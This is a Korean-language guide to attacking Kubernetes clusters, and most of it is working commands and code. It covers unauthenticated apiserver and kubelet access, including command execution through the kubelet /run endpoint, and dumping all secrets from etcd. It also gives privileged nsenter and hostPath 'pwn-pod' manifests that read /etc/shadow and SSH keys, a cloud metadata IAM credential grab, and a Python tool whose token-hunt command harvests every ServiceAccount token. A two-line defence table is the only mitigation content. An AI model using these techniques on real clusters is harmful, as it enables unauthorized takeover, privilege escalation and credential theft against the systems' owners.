# Kubernetes 공격: 클러스터 침투 및 권한 탈취

## 1. Kubernetes 보안 아키텍처 이해

```
kube-apiserver  ←─ 모든 제어 트래픽의 중심
├── etcd          ← 클러스터 상태 저장 (토큰, 시크릿 전체)
├── kube-scheduler
├── kube-controller-manager
└── cloud-controller-manager

노드 컴포넌트
├── kubelet       ← 노드별 에이전트 (API: :10250, :10255)
├── kube-proxy
└── Container Runtime (containerd, CRI-O)

공격 표면
├── kube-apiserver (6443/8080)
├── etcd (2379/2380)
├── kubelet API (10250 인증, 10255 비인증 읽기전용)
├── Dashboard (8001)
└── ServiceAccount 토큰 (/var/run/secrets/kubernetes.io/serviceaccount/)
```

---

## 2. 초기 접근 벡터

### 2.1 노출된 kube-apiserver

```bash
# 인증 없는 API 서버 접근 시도
curl https://TARGET:6443/api/v1/namespaces --insecure
curl http://TARGET:8080/api/v1/namespaces    # 레거시 비인증 포트

# kubectl 익명 접근
kubectl --server=https://TARGET:6443 --insecure-skip-tls-verify \
  get pods --all-namespaces

# 서비스 계정 토큰으로 접근
kubectl --server=https://TARGET:6443 \
  --token=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token) \
  --certificate-authority=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt \
  get pods
```

### 2.2 kubelet API 미인증 접근

```bash
# 포트 10255: 읽기 전용 (인증 불필요, 레거시 설정)
curl http://NODE_IP:10255/pods
curl http://NODE_IP:10255/metrics
curl http://NODE_IP:10255/stats/summary

# 포트 10250: 인증 필요하지만 anonymousAuth=true인 경우
curl --insecure https://NODE_IP:10250/pods
curl --insecure https://NODE_IP:10250/run/default/TARGET_POD/TARGET_CONTAINER \
  -X POST \
  -d "cmd=id"

# 컨테이너 내 명령 실행 (익명 접근 가능 시)
curl --insecure -X POST \
  "https://NODE_IP:10250/run/kube-system/coredns-xxxxx/coredns" \
  -d "cmd=cat /etc/resolv.conf"
```

### 2.3 etcd 직접 접근

```bash
# 비인증 etcd (2379 포트)
etcdctl --endpoints=http://ETCD_IP:2379 get / --prefix --keys-only
etcdctl --endpoints=http://ETCD_IP:2379 get /registry --prefix --keys-only

# 모든 시크릿 덤프
etcdctl --endpoints=http://ETCD_IP:2379 get /registry/secrets --prefix -w json

# ServiceAccount 토큰 추출
etcdctl --endpoints=http://ETCD_IP:2379 \
  get /registry/secrets/kube-system --prefix -w json | \
  python3 -c "import sys,json; data=json.load(sys.stdin); \
  [print(item['key']) for item in data.get('kvs',[])]"

# TLS가 필요한 경우
etcdctl --endpoints=https://ETCD_IP:2379 \
  --cert=/etc/kubernetes/pki/etcd/server.crt \
  --key=/etc/kubernetes/pki/etcd/server.key \
  --cacert=/etc/kubernetes/pki/etcd/ca.crt \
  get /registry/secrets --prefix --keys-only
```

---

## 3. RBAC 설정오류 악용

### 3.1 위험한 RBAC 권한

```yaml
# 과도한 ClusterRoleBinding 예시 (취약한 설정)
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: dangerous-binding
subjects:
- kind: ServiceAccount
  name: default
  namespace: default
roleRef:
  kind: ClusterRole
  name: cluster-admin     # ← 위험: 모든 권한 부여
  apiGroup: rbac.authorization.k8s.io
```

```bash
# 현재 권한 확인
kubectl auth can-i --list
kubectl auth can-i get secrets --all-namespaces
kubectl auth can-i create pods
kubectl auth can-i '*' '*'  # wildcard

# 특정 SA 권한 확인
kubectl auth can-i list secrets \
  --as=system:serviceaccount:default:default

# 클러스터 전체 RBAC 열거
kubectl get clusterrolebindings -o json | \
  python3 -c "
import json, sys
data = json.load(sys.stdin)
for item in data['items']:
    subjects = item.get('subjects', [])
    role = item['roleRef']['name']
    for s in subjects:
        print(f\"{role} → {s.get('kind')}:{s.get('namespace','')}/{s.get('name')}\")
"
```

### 3.2 위험 권한 목록

```bash
# pods/exec: 컨테이너 내 명령 실행
kubectl exec -it <pod> -- /bin/sh

# secrets: 시크릿 전체 읽기
kubectl get secrets --all-namespaces -o json

# create pods: 권한 상승용 Pod 생성
kubectl apply -f - <<EOF
apiVersion: v1
kind: Pod
metadata:
  name: pwn-pod
spec:
  hostPID: true
  hostNetwork: true
  containers:
  - name: pwn
    image: ubuntu
    command: ["/bin/sh", "-c", "nsenter -t 1 -m -u -i -n -- bash"]
    securityContext:
      privileged: true
    volumeMounts:
    - mountPath: /host
      name: host-root
  volumes:
  - name: host-root
    hostPath:
      path: /
EOF

# nodes: 노드 정보 열람 (내부 IP 등)
kubectl get nodes -o wide
```

---

## 4. ServiceAccount 토큰 탈취 및 횡단이동

### 4.1 Pod 내부에서 토큰 사용

```bash
# 자동 마운트되는 SA 토큰
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
CACERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
APISERVER=https://kubernetes.default.svc

# API 서버 호출
curl --cacert $CACERT \
  -H "Authorization: Bearer $TOKEN" \
  $APISERVER/api/v1/namespaces/default/pods

# 다른 네임스페이스의 시크릿 탈취 (권한 있을 때)
curl --cacert $CACERT \
  -H "Authorization: Bearer $TOKEN" \
  $APISERVER/api/v1/namespaces/kube-system/secrets
```

### 4.2 여러 네임스페이스 토큰 수집

```bash
# 모든 SA 토큰 시크릿 목록
kubectl get secrets --all-namespaces -o json | \
  python3 -c "
import json, sys, base64
data = json.load(sys.stdin)
for item in data['items']:
    if item.get('type') == 'kubernetes.io/service-account-token':
        ns = item['metadata']['namespace']
        name = item['metadata']['name']
        token_b64 = item.get('data', {}).get('token', '')
        if token_b64:
            token = base64.b64decode(token_b64).decode()
            print(f'[{ns}/{name}]')
            print(f'  {token[:80]}...')
"
```

### 4.3 네임스페이스 횡단이동

```bash
# 다른 네임스페이스의 Pod에 exec
kubectl exec -n kube-system <privileged-pod> -- bash

# 네임스페이스 간 서비스 접근
# K8s DNS: <service>.<namespace>.svc.cluster.local
curl http://victim-service.victim-namespace.svc.cluster.local:8080

# NetworkPolicy 부재 시 전체 Pod 간 통신 가능
kubectl get networkpolicies --all-namespaces
```

---

## 5. Pod 보안 설정오류 악용

### 5.1 hostPath 볼륨 남용

```bash
# hostPath로 호스트 파일 접근 가능한 Pod 생성
kubectl apply -f - <<EOF
apiVersion: v1
kind: Pod
metadata:
  name: host-reader
spec:
  containers:
  - name: reader
    image: ubuntu
    command: ["sleep", "3600"]
    volumeMounts:
    - mountPath: /host-etc
      name: host-etc
    - mountPath: /host-home
      name: host-home
  volumes:
  - name: host-etc
    hostPath:
      path: /etc
  - name: host-home
    hostPath:
      path: /root
EOF

kubectl exec -it host-reader -- cat /host-etc/shadow
kubectl exec -it host-reader -- cat /host-home/.ssh/id_rsa
```

### 5.2 hostPID / hostNetwork 악용

```bash
# hostPID=true: 호스트 프로세스 가시성 및 조작
kubectl apply -f - <<EOF
apiVersion: v1
kind: Pod
metadata:
  name: host-pid-pod
spec:
  hostPID: true
  containers:
  - name: attacker
    image: ubuntu
    command: ["/bin/sh", "-c"]
    args: ["nsenter -t 1 -m -u -i -n -- cat /etc/shadow"]
    securityContext:
      privileged: true
EOF

# hostNetwork=true: 호스트 네트워크 인터페이스 접근
# → 내부 메타데이터 API, 클라우드 IAM 토큰 탈취
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

---

## 6. Python CLI 도구: K8s 클러스터 보안 열거기

```python
#!/usr/bin/env python3
"""
k8s_security_enum.py - Kubernetes 클러스터 보안 열거 및 RBAC 분석 CLI

의존성:
  pip install kubernetes requests

사용법:
  python k8s_security_enum.py enum-cluster
  python k8s_security_enum.py rbac-audit
  python k8s_security_enum.py find-secrets --namespace kube-system
  python k8s_security_enum.py scan-pods --namespace default
  python k8s_security_enum.py check-kubelet --nodes 10.0.0.1,10.0.0.2
  python k8s_security_enum.py token-hunt
"""

from __future__ import annotations

import argparse
import base64
import json
import os
import socket
import sys
import ssl
import urllib.request
import urllib.error
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field, asdict
from pathlib import Path
from typing import Any


# ── 데이터 클래스 ────────────────────────────────────────────────────────────

@dataclass
class PodRisk:
    namespace: str
    name: str
    node: str
    service_account: str
    risks: list[str] = field(default_factory=list)
    containers: list[dict] = field(default_factory=list)


@dataclass
class RBACRisk:
    subject_kind: str
    subject_name: str
    subject_namespace: str
    role_name: str
    role_kind: str
    is_cluster_admin: bool = False
    dangerous_verbs: list[str] = field(default_factory=list)
    risk_level: str = "LOW"


@dataclass
class KubeletInfo:
    node_ip: str
    port_10250_open: bool = False
    port_10255_open: bool = False
    anonymous_auth: bool = False
    pods_accessible: bool = False
    exec_accessible: bool = False


# ── K8s 클라이언트 래퍼 ──────────────────────────────────────────────────────

class K8sClient:
    """kubernetes Python 클라이언트 래퍼 (in-cluster 및 kubeconfig 지원)"""

    def __init__(self, kubeconfig: str | None = None, in_cluster: bool = False,
                 server: str | None = None, token: str | None = None,
                 insecure: bool = False):
        self.kubeconfig = kubeconfig
        self.in_cluster = in_cluster
        self.server = server
        self.token = token
        self.insecure = insecure
        self._clients: dict[str, Any] = {}
        self._init_client()

    def _init_client(self) -> None:
        try:
            from kubernetes import client, config
            if self.in_cluster:
                config.load_incluster_config()
            elif self.server and self.token:
                configuration = client.Configuration()
                configuration.host = self.server
                configuration.api_key["authorization"] = f"Bearer {self.token}"
                configuration.verify_ssl = not self.insecure
                if self.insecure:
                    configuration.ssl_ca_cert = None
                client.Configuration.set_default(configuration)
            elif self.kubeconfig:
                config.load_kube_config(config_file=self.kubeconfig)
            else:
                config.load_kube_config()

            self._clients["core"] = client.CoreV1Api()
            self._clients["rbac"] = client.RbacAuthorizationV1Api()
            self._clients["apps"] = client.AppsV1Api()
            self._clients["auth"] = client.AuthorizationV1Api()
            self._clients["networking"] = client.NetworkingV1Api()
            self._loaded = True
        except ImportError:
            print("[-] kubernetes 패키지 미설치: pip install kubernetes")
            sys.exit(1)
        except Exception as e:
            print(f"[-] K8s 클라이언트 초기화 실패: {e}")
            sys.exit(1)

    @property
    def core(self):
        return self._clients["core"]

    @property
    def rbac(self):
        return self._clients["rbac"]

    @property
    def apps(self):
        return self._clients["apps"]

    @property
    def auth(self):
        return self._clients["auth"]

    @property
    def networking(self):
        return self._clients["networking"]


# ── 분석 함수 ─────────────────────────────────────────────────────────────────

DANGEROUS_VERBS = {"*", "create", "update", "patch", "delete", "deletecollection"}
DANGEROUS_RESOURCES = {
    "pods", "pods/exec", "pods/attach", "secrets", "configmaps",
    "serviceaccounts", "clusterrolebindings", "rolebindings",
    "nodes", "deployments", "daemonsets", "jobs", "cronjobs",
    "persistentvolumes", "persistentvolumeclaims",
}
CRITICAL_RESOURCES = {"secrets", "pods/exec", "pods/attach", "nodes"}


def analyze_pod_security(pod: Any) -> PodRisk:
    """Pod 보안 설정 분석"""
    meta = pod.metadata
    spec = pod.spec
    risks: list[str] = []

    # hostPID / hostNetwork / hostIPC
    if getattr(spec, "host_pid", False):
        risks.append("CRITICAL: hostPID=true (호스트 프로세스 네임스페이스 공유)")
    if getattr(spec, "host_network", False):
        risks.append("HIGH: hostNetwork=true (호스트 네트워크 네임스페이스 공유)")
    if getattr(spec, "host_ipc", False):
        risks.append("MEDIUM: hostIPC=true (호스트 IPC 네임스페이스 공유)")

    # 볼륨 분석
    for vol in (spec.volumes or []):
        if vol.host_path:
            path = vol.host_path.path
            if path in ("/", "/etc", "/root", "/var/run/docker.sock", "/proc"):
                risks.append(f"CRITICAL: hostPath={path} 마운트")
            else:
                risks.append(f"HIGH: hostPath={path} 마운트")

    containers_info: list[dict] = []
    for container in (spec.containers or []):
        c_info: dict[str, Any] = {"name": container.name, "image": container.image, "risks": []}
        sc = container.security_context

        if sc:
            if getattr(sc, "privileged", False):
                c_info["risks"].append("CRITICAL: privileged=true")
                risks.append(f"CRITICAL: 컨테이너 {container.name} privileged 실행")
            if getattr(sc, "allow_privilege_escalation", None) is not False:
                c_info["risks"].append("MEDIUM: allowPrivilegeEscalation 미비활성화")
            run_as = getattr(sc, "run_as_user", None)
            if run_as is None or run_as == 0:
                c_info["risks"].append("MEDIUM: root(0)로 실행")
            caps = getattr(sc, "capabilities", None)
            if caps:
                add_caps = getattr(caps, "add", None) or []
                for cap in add_caps:
                    c_info["risks"].append(f"HIGH: CAP_{cap} 추가됨")
        else:
            c_info["risks"].append("LOW: securityContext 미설정")

        containers_info.append(c_info)

    # ServiceAccount automount
    if getattr(spec, "automount_service_account_token", None) is not False:
        risks.append("LOW: ServiceAccount 토큰 자동 마운트 활성화")

    sa_name = getattr(spec, "service_account_name", "default") or "default"

    return PodRisk(
        namespace=meta.namespace,
        name=meta.name,
        node=getattr(spec, "node_name", "") or "",
        service_account=sa_name,
        risks=risks,
        containers=containers_info,
    )


def analyze_rbac_binding(binding: Any, is_cluster: bool = True) -> RBACRisk:
    """RBAC 바인딩 위험도 분석"""
    role_name = binding.role_ref.name
    role_kind = binding.role_ref.kind
    subjects = binding.subjects or []
    dangerous_verbs: list[str] = []
    is_cluster_admin = role_name in ("cluster-admin", "admin")
    risk_level = "LOW"

    if is_cluster_admin:
        risk_level = "CRITICAL"
        dangerous_verbs = ["*"]

    for subj in subjects:
        risk = RBACRisk(
            subject_kind=subj.kind,
            subject_name=subj.name,
            subject_namespace=getattr(subj, "namespace", "") or "",
            role_name=role_name,
            role_kind=role_kind,
            is_cluster_admin=is_cluster_admin,
            dangerous_verbs=dangerous_verbs,
            risk_level=risk_level,
        )
        return risk

    return RBACRisk(
        subject_kind="", subject_name="", subject_namespace="",
        role_name=role_name, role_kind=role_kind
    )


def check_kubelet_node(node_ip: str, timeout: int = 3) -> KubeletInfo:
    """노드 kubelet API 접근성 확인"""
    info = KubeletInfo(node_ip=node_ip)

    # 10255 (read-only, no auth)
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        if sock.connect_ex((node_ip, 10255)) == 0:
            info.port_10255_open = True
            # /pods 엔드포인트 접근
            url = f"http://{node_ip}:10255/pods"
            req = urllib.request.Request(url)
            with urllib.request.urlopen(req, timeout=timeout) as resp:
                if resp.status == 200:
                    info.pods_accessible = True
        sock.close()
    except (OSError, urllib.error.URLError):
        pass

    # 10250 (주 API, TLS)
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        if sock.connect_ex((node_ip, 10250)) == 0:
            info.port_10250_open = True
            # 익명 접근 시도
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            url = f"https://{node_ip}:10250/pods"
            req = urllib.request.Request(url)
            with urllib.request.urlopen(req, timeout=timeout, context=ctx) as resp:
                if resp.status == 200:
                    info.anonymous_auth = True
                    info.pods_accessible = True
        sock.close()
    except (OSError, urllib.error.URLError, ssl.SSLError):
        pass

    return info


# ── CLI 커맨드 핸들러 ─────────────────────────────────────────────────────────

def cmd_enum_cluster(args: argparse.Namespace) -> None:
    """클러스터 전체 열거"""
    client = _make_client(args)

    print("[*] Kubernetes 클러스터 열거 시작\n")

    # 노드 목록
    nodes = client.core.list_node()
    print(f"[노드] ({len(nodes.items)}개)")
    for node in nodes.items:
        name = node.metadata.name
        roles = [k.split("/")[-1] for k in (node.metadata.labels or {})
                 if k.startswith("node-role.kubernetes.io/")]
        addrs = {a.type: a.address for a in (node.status.addresses or [])}
        internal_ip = addrs.get("InternalIP", "N/A")
        k8s_ver = node.status.node_info.kubelet_version
        print(f"  {name:40s} {'/'.join(roles) or 'worker':15s} "
              f"{internal_ip:15s} {k8s_ver}")

    # 네임스페이스
    namespaces = client.core.list_namespace()
    print(f"\n[네임스페이스] ({len(namespaces.items)}개)")
    for ns in namespaces.items:
        print(f"  {ns.metadata.name}")

    # 시크릿 수량 (네임스페이스별)
    print(f"\n[시크릿 수량 (네임스페이스별)]")
    for ns in namespaces.items:
        ns_name = ns.metadata.name
        try:
            secrets = client.core.list_namespaced_secret(ns_name)
            count = len(secrets.items)
            if count > 0:
                print(f"  {ns_name:40s} {count}개")
        except Exception:
            pass

    # ServiceAccount 목록
    print(f"\n[ServiceAccount]")
    all_sa = client.core.list_service_account_for_all_namespaces()
    for sa in all_sa.items:
        automount = getattr(sa, "automount_service_account_token", None)
        flag = " [automount=false]" if automount is False else ""
        print(f"  {sa.metadata.namespace:30s} / {sa.metadata.name}{flag}")

    # NetworkPolicy 유무
    print(f"\n[NetworkPolicy 현황]")
    has_netpol: dict[str, int] = {}
    for ns in namespaces.items:
        try:
            nps = client.networking.list_namespaced_network_policy(ns.metadata.name)
            has_netpol[ns.metadata.name] = len(nps.items)
        except Exception:
            has_netpol[ns.metadata.name] = -1

    unprotected = [ns for ns, cnt in has_netpol.items() if cnt == 0]
    print(f"  NetworkPolicy 없는 네임스페이스: {len(unprotected)}개")
    for ns in unprotected:
        print(f"    - {ns} (Pod 간 무제한 통신 가능)")


def cmd_rbac_audit(args: argparse.Namespace) -> None:
    """RBAC 설정오류 감사"""
    client = _make_client(args)

    print("[*] RBAC 감사 시작\n")

    risks: list[RBACRisk] = []

    # ClusterRoleBinding 분석
    crbs = client.rbac.list_cluster_role_binding()
    print(f"ClusterRoleBinding: {len(crbs.items)}개 분석 중...")

    for crb in crbs.items:
        subjects = crb.subjects or []
        role_name = crb.role_ref.name
        is_admin = role_name in ("cluster-admin",)

        for subj in subjects:
            risk_level = "CRITICAL" if is_admin else "MEDIUM"

            # system:anonymous나 system:unauthenticated 체크
            if subj.name in ("system:anonymous", "system:unauthenticated"):
                risk_level = "CRITICAL"

            risk = RBACRisk(
                subject_kind=subj.kind,
                subject_name=subj.name,
                subject_namespace=getattr(subj, "namespace", "") or "",
                role_name=role_name,
                role_kind=crb.role_ref.kind,
                is_cluster_admin=is_admin,
                risk_level=risk_level,
            )
            risks.append(risk)

    # RoleBinding (모든 네임스페이스)
    rbs = client.rbac.list_role_binding_for_all_namespaces()
    print(f"RoleBinding: {len(rbs.items)}개 분석 중...")

    for rb in rbs.items:
        subjects = rb.subjects or []
        role_name = rb.role_ref.name

        for subj in subjects:
            is_admin = role_name in ("admin", "cluster-admin")
            risk = RBACRisk(
                subject_kind=subj.kind,
                subject_name=subj.name,
                subject_namespace=rb.metadata.namespace,
                role_name=role_name,
                role_kind=rb.role_ref.kind,
                is_cluster_admin=is_admin,
                risk_level="HIGH" if is_admin else "LOW",
            )
            risks.append(risk)

    # ClusterRole의 위험 권한 분석
    print(f"\n위험 ClusterRole 권한 분석...")
    crs = client.rbac.list_cluster_role()
    dangerous_roles: list[dict] = []

    for cr in crs.items:
        if cr.metadata.name.startswith("system:"):
            continue
        role_risks: list[str] = []
        for rule in (cr.rules or []):
            verbs = set(rule.verbs or [])
            resources = set(rule.resources or [])
            if "*" in verbs and "*" in resources:
                role_risks.append("wildcard(*) 모든 리소스/동작")
            for res in resources & CRITICAL_RESOURCES:
                if verbs & DANGEROUS_VERBS:
                    role_risks.append(f"{res} 에 {verbs & DANGEROUS_VERBS} 권한")

        if role_risks:
            dangerous_roles.append({
                "name": cr.metadata.name,
                "risks": role_risks
            })

    # 출력
    print(f"\n{'='*70}")
    print("CRITICAL/HIGH RBAC 위험 목록:")
    print(f"{'='*70}")

    critical_risks = [r for r in risks if r.risk_level in ("CRITICAL", "HIGH")]
    for r in critical_risks:
        print(f"[{r.risk_level}] {r.subject_kind}/{r.subject_name}"
              f" (ns:{r.subject_namespace}) → {r.role_kind}/{r.role_name}")
        if r.is_cluster_admin:
            print(f"  ⚠ cluster-admin 권한 부여됨!")

    print(f"\n위험 ClusterRole ({len(dangerous_roles)}개):")
    for dr in dangerous_roles:
        print(f"  {dr['name']}:")
        for risk in dr["risks"]:
            print(f"    - {risk}")

    print(f"\n[요약]")
    print(f"  분석된 바인딩: {len(risks)}개")
    print(f"  CRITICAL: {sum(1 for r in risks if r.risk_level == 'CRITICAL')}개")
    print(f"  HIGH: {sum(1 for r in risks if r.risk_level == 'HIGH')}개")

    if args.output:
        data = [asdict(r) for r in risks]
        Path(args.output).write_text(json.dumps(data, indent=2, ensure_ascii=False))
        print(f"\n[+] 결과 저장: {args.output}")


def cmd_find_secrets(args: argparse.Namespace) -> None:
    """시크릿 열거 및 민감 정보 탐색"""
    client = _make_client(args)
    namespace = args.namespace

    if namespace:
        secrets_list = client.core.list_namespaced_secret(namespace)
    else:
        secrets_list = client.core.list_secret_for_all_namespaces()

    print(f"[*] {len(secrets_list.items)}개 시크릿 분석\n")

    sensitive_patterns = [
        "password", "passwd", "secret", "token", "key", "api",
        "credential", "auth", "private", "cert", "tls",
    ]

    for secret in secrets_list.items:
        ns = secret.metadata.namespace
        name = secret.metadata.name
        stype = secret.type

        if stype == "kubernetes.io/service-account-token":
            if args.show_tokens:
                data = secret.data or {}
                token_b64 = data.get("token", "")
                if token_b64:
                    token = base64.b64decode(token_b64).decode()
                    print(f"[SA TOKEN] {ns}/{name}")
                    print(f"  {token[:120]}...")
            continue

        data = secret.data or {}
        for key, val in data.items():
            key_lower = key.lower()
            if any(pat in key_lower for pat in sensitive_patterns):
                try:
                    decoded = base64.b64decode(val).decode("utf-8", errors="replace")
                    if args.show_values:
                        print(f"[SECRET] {ns}/{name} → {key}: {decoded[:100]}")
                    else:
                        print(f"[SECRET] {ns}/{name} → {key}: {'*' * min(len(decoded), 20)} [{len(decoded)}bytes]")
                except Exception:
                    pass


def cmd_scan_pods(args: argparse.Namespace) -> None:
    """Pod 보안 설정 스캔"""
    client = _make_client(args)
    namespace = args.namespace

    if namespace:
        pods_list = client.core.list_namespaced_pod(namespace)
    else:
        pods_list = client.core.list_pod_for_all_namespaces()

    print(f"[*] {len(pods_list.items)}개 Pod 보안 분석\n")

    results: list[PodRisk] = []
    for pod in pods_list.items:
        try:
            result = analyze_pod_security(pod)
            results.append(result)
        except Exception as e:
            print(f"[-] {pod.metadata.namespace}/{pod.metadata.name} 분석 실패: {e}")

    results.sort(key=lambda x: len(x.risks), reverse=True)

    for pod_risk in results:
        if not pod_risk.risks:
            continue
        print(f"{'─'*60}")
        print(f"Pod: {pod_risk.namespace}/{pod_risk.name}")
        print(f"  노드: {pod_risk.node} | SA: {pod_risk.service_account}")
        print(f"  위험 ({len(pod_risk.risks)}개):")
        for r in pod_risk.risks:
            print(f"    ⚠ {r}")

    critical = sum(1 for p in results if any("CRITICAL" in r for r in p.risks))
    high = sum(1 for p in results if any("HIGH" in r for r in p.risks))
    print(f"\n[요약] 총 {len(results)}개 Pod | CRITICAL:{critical} HIGH:{high}")

    if args.output:
        data = [asdict(r) for r in results]
        Path(args.output).write_text(json.dumps(data, indent=2, ensure_ascii=False))
        print(f"[+] 결과 저장: {args.output}")


def cmd_check_kubelet(args: argparse.Namespace) -> None:
    """kubelet API 미인증 접근 탐지"""
    nodes_input: list[str] = []

    if args.nodes:
        nodes_input = [n.strip() for n in args.nodes.split(",")]
    elif args.from_cluster:
        client = _make_client(args)
        node_list = client.core.list_node()
        for node in node_list.items:
            for addr in (node.status.addresses or []):
                if addr.type == "InternalIP":
                    nodes_input.append(addr.address)
    else:
        print("[-] --nodes 또는 --from-cluster 필요")
        sys.exit(1)

    print(f"[*] {len(nodes_input)}개 노드 kubelet API 스캔\n")

    results: list[KubeletInfo] = []
    with ThreadPoolExecutor(max_workers=20) as executor:
        futures = {executor.submit(check_kubelet_node, ip): ip for ip in nodes_input}
        for future in as_completed(futures):
            info = future.result()
            results.append(info)
            status_parts = []
            if info.port_10255_open:
                status_parts.append("10255:OPEN")
            if info.port_10250_open:
                status_parts.append("10250:OPEN")
            if info.anonymous_auth:
                status_parts.append("ANON_AUTH:VULNERABLE")
            if info.pods_accessible:
                status_parts.append("PODS:ACCESSIBLE")
            if status_parts:
                print(f"  [!] {info.node_ip}: {' | '.join(status_parts)}")
            else:
                print(f"  [OK] {info.node_ip}: 정상")

    vulnerable = [r for r in results if r.anonymous_auth or r.pods_accessible]
    print(f"\n[요약] {len(results)}개 노드 | 취약: {len(vulnerable)}개")


def cmd_token_hunt(args: argparse.Namespace) -> None:
    """클러스터 내 모든 SA 토큰 수집 (권한 상승용)"""
    client = _make_client(args)

    print("[*] ServiceAccount 토큰 수집 시작\n")

    all_secrets = client.core.list_secret_for_all_namespaces()
    tokens_found: list[dict] = []

    for secret in all_secrets.items:
        if secret.type != "kubernetes.io/service-account-token":
            continue
        data = secret.data or {}
        token_b64 = data.get("token", "")
        if not token_b64:
            continue
        try:
            token = base64.b64decode(token_b64).decode()
        except Exception:
            continue

        # JWT 디코딩 (서명 검증 없이)
        parts = token.split(".")
        sa_info = {}
        if len(parts) == 3:
            try:
                payload_raw = parts[1]
                # base64 패딩 보정
                padding = 4 - len(payload_raw) % 4
                payload_raw += "=" * (padding % 4)
                payload = json.loads(base64.b64decode(payload_raw).decode())
                sa_name = payload.get("kubernetes.io", {}).get("serviceaccount", {}).get("name", "")
                sa_namespace = payload.get("kubernetes.io", {}).get("namespace", "")
                sa_info = {"sa_name": sa_name, "sa_namespace": sa_namespace}
            except Exception:
                pass

        token_entry = {
            "namespace": secret.metadata.namespace,
            "secret_name": secret.metadata.name,
            "sa_name": sa_info.get("sa_name", ""),
            "token_preview": token[:60] + "...",
            "full_token": token if args.full_tokens else "",
        }
        tokens_found.append(token_entry)
        print(f"  [{secret.metadata.namespace}] {secret.metadata.name}")
        print(f"    SA: {sa_info.get('sa_name', 'N/A')}")
        if args.full_tokens:
            print(f"    Token: {token[:80]}...")
        print()

    print(f"[요약] {len(tokens_found)}개 토큰 발견")

    if args.output:
        Path(args.output).write_text(
            json.dumps(tokens_found, indent=2, ensure_ascii=False)
        )
        print(f"[+] 결과 저장: {args.output}")


# ── 헬퍼 ─────────────────────────────────────────────────────────────────────

def _make_client(args: argparse.Namespace) -> K8sClient:
    in_cluster = getattr(args, "in_cluster", False)
    server = getattr(args, "server", None)
    token = getattr(args, "token", None)
    kubeconfig = getattr(args, "kubeconfig", None)
    insecure = getattr(args, "insecure", False)

    if token and server:
        return K8sClient(server=server, token=token, insecure=insecure)
    if in_cluster:
        return K8sClient(in_cluster=True)
    return K8sClient(kubeconfig=kubeconfig)


# ── argparse ──────────────────────────────────────────────────────────────────

def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        prog="k8s_security_enum",
        description="Kubernetes 클러스터 보안 열거 및 공격 표면 분석",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )

    # 공통 인자
    common = argparse.ArgumentParser(add_help=False)
    common.add_argument("--kubeconfig", help="kubeconfig 파일 경로")
    common.add_argument("--in-cluster", action="store_true", help="In-cluster 설정 사용")
    common.add_argument("--server", help="API 서버 URL")
    common.add_argument("--token", help="Bearer 토큰")
    common.add_argument("--insecure", action="store_true", help="TLS 검증 비활성화")
    common.add_argument("--output", "-o", help="결과 저장 파일(JSON)")

    sub = parser.add_subparsers(dest="command", required=True)

    # enum-cluster
    sub.add_parser("enum-cluster", parents=[common], help="클러스터 전체 열거")

    # rbac-audit
    sub.add_parser("rbac-audit", parents=[common], help="RBAC 설정오류 감사")

    # find-secrets
    p_sec = sub.add_parser("find-secrets", parents=[common], help="시크릿 열거")
    p_sec.add_argument("--namespace", "-n", help="특정 네임스페이스")
    p_sec.add_argument("--show-values", action="store_true", help="시크릿 값 표시")
    p_sec.add_argument("--show-tokens", action="store_true", help="SA 토큰 표시")

    # scan-pods
    p_pods = sub.add_parser("scan-pods", parents=[common], help="Pod 보안 스캔")
    p_pods.add_argument("--namespace", "-n", help="특정 네임스페이스")

    # check-kubelet
    p_kub = sub.add_parser("check-kubelet", parents=[common], help="kubelet API 미인증 탐지")
    p_kub.add_argument("--nodes", help="노드 IP 목록 (콤마 구분)")
    p_kub.add_argument("--from-cluster", action="store_true", help="클러스터에서 노드 IP 자동 수집")

    # token-hunt
    p_tok = sub.add_parser("token-hunt", parents=[common], help="SA 토큰 전체 수집")
    p_tok.add_argument("--full-tokens", action="store_true", help="전체 토큰 출력")

    return parser


def main() -> None:
    parser = build_parser()
    args = parser.parse_args()

    dispatch = {
        "enum-cluster": cmd_enum_cluster,
        "rbac-audit": cmd_rbac_audit,
        "find-secrets": cmd_find_secrets,
        "scan-pods": cmd_scan_pods,
        "check-kubelet": cmd_check_kubelet,
        "token-hunt": cmd_token_hunt,
    }

    handler = dispatch.get(args.command)
    if handler:
        handler(args)
    else:
        parser.print_help()


if __name__ == "__main__":
    main()
```

---

## 7. 실전 공격 시나리오

### 시나리오 1: SA 토큰 → cluster-admin 권한 상승

```bash
# 1. Pod 내부에서 SA 토큰 획득
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)

# 2. 현재 권한 확인
kubectl auth can-i --list --token=$TOKEN

# 3. create pods 권한 있을 때 → 권한 상승 Pod 생성
kubectl apply -f privesc-pod.yaml --token=$TOKEN

# 4. 권한 있는 Pod에서 호스트 접근
kubectl exec -it privesc-pod -- chroot /host

# 5. 호스트에서 kubeconfig 탈취
cat /etc/kubernetes/admin.conf
```

### 시나리오 2: etcd → 전체 클러스터 장악

```bash
# etcd에서 관리자 클라이언트 인증서 추출
etcdctl get /registry/secrets/kube-system/admin-cert --print-value-only | \
  python3 -c "
import sys, json, base64
data = sys.stdin.read()
# etcd는 protobuf 인코딩이므로 실제로는 파서 필요
print(data[:200])
"

# 또는 control plane 노드의 /etc/kubernetes/pki에서 직접 탈취
ssh control-plane-node
cat /etc/kubernetes/admin.conf > /tmp/stolen-kubeconfig
kubectl --kubeconfig /tmp/stolen-kubeconfig get all --all-namespaces
```

---

## 8. 방어 체크리스트

| 항목 | 설정 |
|------|------|
| RBAC 최소 권한 | ClusterRole에 필요한 리소스/동작만 지정 |
| SA 토큰 자동마운트 비활성화 | `automountServiceAccountToken: false` |
